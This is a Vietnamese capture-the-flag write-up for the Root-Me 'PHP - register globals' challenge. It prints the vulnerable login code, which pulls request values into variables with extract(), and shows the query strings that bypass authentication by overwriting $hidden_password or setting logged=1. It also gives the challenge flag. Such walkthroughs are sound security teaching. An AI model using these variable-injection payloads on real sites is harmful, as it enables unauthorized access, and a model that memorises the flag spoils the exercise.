# [PHP - register globals](https://www.root-me.org/en/Challenges/Web-Server/PHP-register-globals)

## Solutions

- Sử dụng dirsearch, tìm thấy được 2 file:
  - 200 -    0B  - /web-serveur/ch17/config.inc.php
  - 200 -    1KB - /web-serveur/ch17/index.php.bak

- Trong đó truy cập đến file config.inc.php thì không thấy gì còn file index.php.bak ta lấy được source code php:

```php
<?php


function auth($password, $hidden_password){
    $res=0;
    if (isset($password) && $password!=""){
        if ( $password == $hidden_password ){
            $res=1;
        }
    }
    $_SESSION["logged"]=$res;
    return $res;
}



function display($res){
    $aff= '
          <html>
          <head>
          </head>
          <body>
            <h1>Authentication v 0.05</h1>
            <form action="" method="POST">
              Password&nbsp;<br/>
              <input type="password" name="password" /><br/><br/>
              <br/><br/>
              <input type="submit" value="connect" /><br/><br/>
            </form>
            <h3>'.htmlentities($res).'</h3>
          </body>
          </html>';
    return $aff;
}

session_start();
if ( ! isset($_SESSION["logged"]) )
    $_SESSION["logged"]=0;

$aff="";
include("config.inc.php");

if (isset($_POST["password"]))
    $password = $_POST["password"];

if (!ini_get('register_globals')) {
    $superglobals = array($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);
    if (isset($_SESSION)) {
        array_unshift($superglobals, $_SESSION);
    }
    foreach ($superglobals as $superglobal) {
        extract($superglobal, 0 );
    }
}

if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
    $aff=display("well done, you can validate with the password : $hidden_password");
} else {
    $aff=display("try again");
}

echo $aff;

?>
```

- Thử gửi request đến index.php:
  - `index.php?password=3&hidden_password=3`: pass được qua hàm kiểm tra mật khẩu nhưng biến $hidden_password đã bị ghi đè thành 3
  - `index.php?logged=1`: lấy được flag `NoTQYipcRKkgrqG`

## References

- <https://repository.root-me.org/Programmation/PHP/EN%20-%20Using%20register%20globals%20in%20PHP.pdf>
